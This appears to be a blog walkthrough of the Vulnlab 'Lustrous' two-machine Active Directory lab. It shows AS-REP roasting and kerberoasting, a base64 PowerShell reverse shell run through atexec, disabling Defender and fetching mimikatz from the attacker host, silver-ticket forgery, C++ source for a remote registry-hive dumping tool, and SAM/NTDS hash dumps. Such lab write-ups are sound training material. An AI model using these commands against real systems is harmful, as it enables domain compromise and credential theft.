---
categories:
- Vulnlab
image:
  path: vl_lustrous.png
layout: post
media_subpath: /assets/posts/2021-12-27-lab-lustrous-walkthrough
tags:
- active directory
- vulnlab
title: Lab - Lustrous Walkthrough
---

This is a short walkthrough on Lustrous, a chain consisting of 2 machines on vulnlab. The main lesson on this chain is to demonstrate how silver tickets can be used with service accounts in a Active Directory environment. Please read this [post](http://127.0.0.1/2022/01/08/kerberos-silver-tickets/) for a more detailed explanation on silver tickets, this post will only show the steps required for exploitation.

## LusMS

LusMS is a server in the lustrous.vl domain. We start by running a quick portscan:

```
nmap -Pn 10.10.10.9
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
```

There really isn’t any port here that would allow immediate access. We can check anonymous access on SMB, but in this case it is not possible. Since we have a domain controller we can however explore Active Directory related attack vectors. Before doing so, we notice that the domain controller is running an ftp server which is pretty unusual:

```
ftp 10.10.10.8
Connected to 10.10.10.8.
220 Microsoft FTP Service
Name (10.10.10.8:xct): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||50100|)
150 Opening ASCII mode data connection.
12-26-21  11:50AM       <DIR>          transfer
226 Transfer complete.
ftp> ls
229 Entering Extended Passive Mode (|||50101|)
125 Data connection already open; Transfer starting.
12-26-21  11:51AM       <DIR>          ben.cox
12-26-21  11:49AM       <DIR>          rachel.parker
12-26-21  11:49AM       <DIR>          tony.ward
12-26-21  11:50AM       <DIR>          wayne.taylor
```

We can see a transfer folder, probably to exchange files between employees. This gives us a short list of usernames to work with. A common active directory attack that only requires usernames is asreproasting (note that you could also bruteforce users with kerbrute, but in this case they were provided). This type of roast targets users that have the "Do not require Kerberos Preauthentication" checkbox checked in the user account settings (mostly for legacy reasons).

```
impacket-GetNPUsers LUSTROUS/ -usersfile users.txt -format john -outputfile asrep.hash -dc-ip lustrous.vl
```

We crack the resulting hash and obtain credentials for a user:

```
cat asrep.hash
$krb5asrep$ben.cox@LUSTROUS:1e74...

john -w=~/tools/SecLists/Passwords/Leaked-Databases/rockyou.txt asrep.hash
Trinity1         ($krb5asrep$ben.cox@LUSTROUS)
```

We can use this user to connect via WinRM to the target server:

```
ruby ~/tools/evil-winrm/evil-winrm.rb -i 10.10.10.9 -u 'ben.cox' -p 'Trinity1'
*Evil-WinRM* PS C:\Users\ben.cox\Documents> hostname; whoami
LusMS
lustrous\ben.cox
```

On the users desktop we find a "admin.xml" file. This is a powershell stored credential, which is encrypted using DPAPI. This means that only the user who encrypted it can decrypt it. Luckily our user "ben.cox" encrypted this file himself and we can get the administrator password for the server:

```
(Import-Clixml admin.xml).GetNetworkCredential().Password
...
```

Now we could use the administrator credentials to psexec into the machine – Defender is however preventing psexec nowadays. An alternative is atexec, which is not detected. We use it to get a shell via powershell & read the root flag ([Cyberchef](https://gchq.github.io/CyberChef/#recipe=Encode_text('UTF-16LE%20(1200)')To_Base64('A-Za-z0-9%2B/%3D')&input=JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgiMTAuOC4wLjIiLDQ0Myk7JHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7W2J5dGVbXV0kYnl0ZXMgPSAwLi42NTUzNXwlezB9O3doaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCl7OyRkYXRhID0gKE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZygkYnl0ZXMsMCwgJGkpOyRzZW5kYmFjayA9IChpZXggJGRhdGEgMj4mMSB8IE91dC1TdHJpbmcgKTskc2VuZGJhY2syID0gJHNlbmRiYWNrICsgIj5fICI7JHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOyRzdHJlYW0uV3JpdGUoJHNlbmRieXRlLDAsJHNlbmRieXRlLkxlbmd0aCk7JHN0cmVhbS5GbHVzaCgpfTskY2xpZW50LkNsb3NlKCk)):

```
impacket-atexec 'Administrator'@10.10.10.9 "powershell -enc JABjA..."

[*] Creating task \WKgkbqnU
[*] Running task \WKgkbqnU
[*] Deleting task \WKgkbqnU

nc -lnvp 443
listening on [any] 443 ...
connect to [10.8.0.2] from (UNKNOWN) [10.10.10.9] 53123
whoami
nt authority\system

cd \users\administrator\desktop
>_ type root.txt
VL{...}
```

At this point one would usually go for post exploitation, e.g. dump hashes, search for interesting files but there is nothing particular interesting here.

## LusDC

LusDC is a domain controller in the lustrous.vl domain. The portscan shows:

```
nmap -Pn 10.10.10.8
PORT     STATE SERVICE
21/tcp   open  ftp
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
443/tcp  open  https
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
```

On port 80 we have a web application that requires kerberos authentication. We can try to connect with curl and get a 401:

```
curl  http://lusdc.lustrous.vl

...
<title>401 - Unauthorized: Access is denied due to invalid credentials.</title>
...
```

Since we already compromised the other machine, we can try to connect as SYSTEM (computer accounts are perfectly valid):

```
iwr http://lusdc.lustrous.vl/Internal -UseBasicParsing -UseDefaultCredentials | Select-Object -Expand Content

...
<h2>Notes</h2>
<p>Welcome, LUSTROUS\LUSMS$!</p>
...
```

We can see that the application is authenticating & greeting us. This confirms that kerberos authentication is in use and the machine account was indeed used. This is a note taking application but this machine account has not stored any notes. At this point it makes sense to check whether there are any service accounts which we can kerberoast & crack their hashes:

```
impacket-GetUserSPNs lustrous.vl/Ben.Cox:'Trinity1' -dc-ip lustrous.vl -outputfile kerberoast.hash

http/lusdc               svc_web            2021-12-22 13:46:12.670282  2021-12-27 15:33:49.453357
http/lusdc.lustrous.vl   svc_web            2021-12-22 13:46:12.670282  2021-12-27 15:33:49.453357
MSSQL/lusdc              svc_db             2021-12-22 13:46:34.170590  <never>
MSSQL/lusdc.lustrous.vl  svc_db             2021-12-22 13:46:34.170590  <never>
```

This gives us 2 users of which one of them has a crackable password:

```
john -w=~/tools/SecLists/Passwords/Leaked-Databases/rockyou.txt asrep.hash
svc_web:iydgTvmujl6f
```

Services in domains are often run by service accounts instead of using local accounts like SYSTEM. Since the account is called svc\_web we assume the application pool on the webserver is run by this user. This gives us an interesting attack vector. We can generate a silver ticket using the ntlm hash of svc\_web & impersonate any user against the web application.

One issue that remains is that we do not really know which user to impersonate and trying every user can be cumbersome. This is a note taking application and we probably have to read the personal notes of a specific user. To gain some insight into the domain, we run bloodhound:

```
bloodhound-python -u svc_web -p 'iydgTvmujl6f' -ns 10.10.10.8 -d lustrous.vl -c all
INFO: Found AD domain: lustrous.vl
INFO: Connecting to LDAP server: lusdc.lustrous.vl
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: lusdc.lustrous.vl
INFO: Found 27 users
INFO: Found 58 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: LusMS.lustrous.vl
INFO: Querying computer: LusDC.lustrous.vl
INFO: Done in 00M 03S
```

We start up bloodhound & neo4j and explore the domain. One issue with this approach is that it misses certain builtin groups. If we use our SYSTEM shell on LusMS we can see that "tony.ward" is in the "backup admins" group so we decide to target him.

```
>_ net users tony.ward /domain
The request will be processed at a domain controller for domain lustrous.vl.

...

Local Group Memberships
Global Group memberships     *Domain Users         *it
                             *Backup Admins
The command completed successfully.
```

To create the silver ticket for tony, we first disable av & upload mimikatz.

```
>_ cd c:\
>_ mkdir temp
>_ cd temp
>_ set-mppreference -disablerealtimemonitoring $true
>_ iwr http://10.8.0.2/drop/mimikatz.exe -outfile mimikatz.exe
```

Then we use mimikatz to create the ticket & pass it to the current session.

```
.\mimikatz.exe "kerberos::purge" "kerberos::golden /sid:S-1-5-21-2355092754-1584501958-1513963426 /domain:lustrous.vl /id:1114 /target:lusdc.lustrous.vl /service:http /rc4:E67AF8B3D78DF5A02EB0D57B6CB60717 /ptt /user:tony.ward" "exit"

mimikatz(commandline) # kerberos::purge
Ticket(s) purge for current session is OK

mimikatz(commandline) # kerberos::golden /sid:S-1-5-21-2355092754-1584501958-1513963426 /domain:lustrous.vl /id:1114 /target:lusdc.lustrous.vl /service:http /rc4:E67AF8B3D78DF5A02EB0D57B6CB60717 /ptt /user:tony.ward
User      : tony.ward
Domain    : lustrous.vl (LUSTROUS)
SID       : S-1-5-21-2355092754-1584501958-1513963426
User Id   : 1114
Groups Id : *513 512 520 518 519
ServiceKey: e67af8b3d78df5a02eb0d57b6cb60717 - rc4_hmac_nt
Service   : http
Target    : lusdc.lustrous.vl
Lifetime  : 12/27/2021 2:55:42 PM ; 12/25/2031 2:55:42 PM ; 12/25/2031 2:55:42 PM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'tony.ward @ lustrous.vl' successfully submitted for current session
mimikatz(commandline) # exit
Bye!

>_ iwr http://lusdc.lustrous.vl/Internal -UseBasicParsing -UseDefaultCredentials | Select-Object -Expand Content
...
<td>
    4
</td>
<td>
    Password Reminder
</td>
<td>
    U_cPVQqEI50i1X
</td>
<td>
    lustrous_tony.ward
</td>
<td>
    <a class="btn btn-danger" href="/Internal/DeleteNote/4">Delete</a>
</td>
...
```

**Alternatively** one can also use impacket-ticketer to get a valid ticket (note that if you want to use firefox after creating the ticket, you need to set "network.negotiate-auth.trusted-uris" to "https://lusdc.lustrous.vl"):

```
impacket-ticketer -nthash E67AF8B3D78DF5A02EB0D57B6CB60717 -domain-sid S-1-5-21-2355092754-1584501958-1513963426 -domain lustrous.vl -spn HTTP/lusdc.lustrous.vl -user-id 1114 tony.ward
```

We now have the credentials of "Backup Admins" which are in the "Backup Operators" group. Unfortunatly we do not have a shell on the target system though.

One way to still proceed is a great tool by who4m1:

<https://github.com/Wh04m1001/Random/blob/main/BackupOperators.cpp>

```cpp
#include <stdio.h>
#include <Windows.h>

void MakeToken() {
    HANDLE token;
    const char username[] = "<username>";
    const char password[] = "<password>";
    const char domain[] = "<domain>";

    if (LogonUserA(username, domain, password, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &token) == 0) {
        printf("LogonUserA: %d\n", GetLastError());
        exit(0);
    }
    if (ImpersonateLoggedOnUser(token) == 0) {
        printf("ImpersonateLoggedOnUser: %d\n", GetLastError());
        exit(0);
    }
}

int main()
{
    HKEY hklm;
    HKEY hkey;
    DWORD result;
    const char* hives[] = { "SAM","SYSTEM","SECURITY" };
    const char* files[] = { "C:\\windows\\temp\\sam.hive","C:\\windows\\temp\\system.hive","C:\\windows\\temp\\security.hive" };
    
    //Uncomment if using alternate credentials.
    //MakeToken();

    result = RegConnectRegistryA("\\\\<computername>", HKEY_LOCAL_MACHINE,&hklm);
    if (result != 0) {
        printf("RegConnectRegistryW: %d\n", result);
        exit(0);
    }
    for (int i = 0; i < 3; i++) {

        printf("Dumping %s hive to %s\n", hives[i], files[i]);
        result = RegOpenKeyExA(hklm, hives[i], REG_OPTION_BACKUP_RESTORE | REG_OPTION_OPEN_LINK, KEY_READ, &hkey);
        if (result != 0) {
            printf("RegOpenKeyExA: %d\n", result);
            exit(0);
        }
        result = RegSaveKeyA(hkey, files[i], NULL);
        if (result != 0) {
            printf("RegSaveKeyA: %d\n", result);
            exit(0);
        }
    }
}
```

This allows us to connect to the remote registry and use our Backup Operators privileges to copy out SAM/SYSTEM/SECURITY from LusDC to LusMS. In order to use the tool we compile it with Visual Studio & upload it to LusMS. Then we dump the files from the registry on the dc, to "\\windows\\temp" on the dc:

```
>_ iwr http://10.8.0.2/SeRemoteBackup.exe -outfile SeRemoteBackup.exe
>_ .\SeRemoteBackup.exe
Dumping SAM hive to C:\windows\temp\sam.hive
Dumping SYSTEM hive to C:\windows\temp\system.hive
Dumping SECURITY hive to C:\windows\temp\security.hive
```

Finally we connect as "tony.ward" via smbclient & download the files:

```
smb: \windows\> cd temp
smb: \windows\temp\> dir
NT_STATUS_ACCESS_DENIED listing \windows\temp\*
smb: \windows\temp\> get sam.hive
getting file \windows\temp\sam.hive of size 28672 as sam.hive (405.8 KiloBytes/sec) (average 405.8 KiloBytes/sec)
smb: \windows\temp\> get system.hive
getting file \windows\temp\system.hive of size 17358848 as system.hive (9258.3 KiloBytes/sec) (average 8936.8 KiloBytes/sec)
smb: \windows\temp\> get security.hive
getting file \windows\temp\security.hive of size 45056 as security.hive (571.4 KiloBytes/sec) (average 8611.0 KiloBytes/sec)
```

Now we can use pypykatz to get the hashes, connect as administrator and read the flag:

```
pypykatz registry --sam sam --security security system
...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:1e10fc3898a203cbc159f559d8183297:::
...
=== LSA Machine account password ===
History: False
NT: 66ff...
...
```

We dumped the local administrator hash, if the domain administrator password would be the same we would be done here. If not, we can use the machine account hash to do a proper secretsdump now and use any domain admin to log in:

```
impacket-secretsdump 'LusDC$'@10.10.219.197 -hashes :66ff...
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:b8...
...
```

  
That’s it for this chain, thank you for reading :)